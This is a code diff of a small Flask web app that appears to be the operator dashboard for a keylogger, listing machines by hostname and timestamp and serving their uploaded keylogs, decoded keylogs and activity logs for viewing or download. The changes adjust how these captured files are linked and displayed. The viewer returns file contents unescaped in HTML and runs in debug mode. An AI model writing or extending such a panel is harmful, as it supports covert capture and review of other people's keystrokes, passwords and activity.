@@ -51,16 +51,8 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for idx, file in enumerate(folder.files) %}
-            <td>
-              {% if file %}
-                {% if idx in [3, 4] %} {# Keylogs / Decoded Keylogs #}
-                  <a href="{{ file.replace('/download/', '/view/') }}" target="_blank">📄 View</a>
-                {% else %}
-                  <a href="{{ file }}">📥 View/Download</a>
-                {% endif %}
-              {% else %}-{% endif %}
-            </td>
+          {% for file, name in folder.files %}
+            <td>{% if file %}<a href="{{ file }}">📄 View</a>{% else %}-{% endif %}</td>
           {% endfor %}
         </tr>
       {% endfor %}
@@ -106,11 +98,14 @@ def index():
                         }
                         patterns = alternatives.get(normalized, [normalized])
                         if any(p in f.lower() for p in patterns):
-                            row["files"].append(f"/download/{folder}/{f}")
+                            if normalized in ["keylogs", "decoded_keylogs"]:
+                                row["files"].append((f"/view/{folder}/{f}", f))
+                            else:
+                                row["files"].append((f"/download/{folder}/{f}", f))
                             matched = True
                             break
                     if not matched:
-                        row["files"].append(None)
+                        row["files"].append((None, ""))
 
                 activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
                 if activity_log_file:
@@ -145,13 +140,16 @@ def download(folder, filename):
     return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename, as_attachment=True)
 
 @app.route("/view/<folder>/<filename>")
-def view_text(folder, filename):
-    try:
-        with open(os.path.join(UPLOAD_ROOT, folder, filename), "r", encoding="utf-8") as f:
-            content = f.read().replace("\n", "<br>").replace(" ", "&nbsp;")
-        return f"<body style='background:black;color:lime;font-family:monospace;padding:10px;'>{content}</body>"
-    except:
+def view_file(folder, filename):
+    path = os.path.join(UPLOAD_ROOT, folder, filename)
+    if not os.path.exists(path):
         abort(404)
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            content = f.read()
+        return f"<pre style='white-space: pre-wrap; background:black; color:lime; padding:20px;'>{content}</pre>"
+    except:
+        abort(500)
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(debug=True) 
